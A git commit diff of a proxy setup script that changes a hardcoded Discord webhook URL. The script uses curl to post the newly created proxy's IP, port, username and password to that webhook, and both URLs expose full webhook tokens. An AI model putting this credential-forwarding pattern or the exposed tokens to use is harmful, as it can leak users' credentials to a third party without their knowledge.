292282194743bbc0d2bbbf672ed225b23a0d249b
LemonProxiesDev <70445676+LemonProxiesDev@users.noreply.github.com>
2020-09-01 14:56:03 +0200

    Update cp.sh
    fixed discord notify

--- cp.sh
+++ cp.sh
@@ -25,6 +25,6 @@ echo -e "\e[1;93mYour Proxy is : ${ip}:${port}:${user}:${passw}\e[0m"
 msg_content=\"$ip:$port:$user:$passw\"
 
 ## discord webhook
-url='https://discordapp.com/api/webhooks/750307253541797960/8GkGqqlZhfUfJH-PthUq7LraaCYoMYknP9iFMYBRiM0iyATYonATNsDqfGVN7qJ1HvKf'
+url='https://discordapp.com/api/webhooks/750337905054056588/5fP6iSAPGFHi2un9ayvAGHtokf7BSf5FWTSP86BdgbU2oJKI9icZRDSUcDqcSFy2A7h5'
 curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}" $url
 
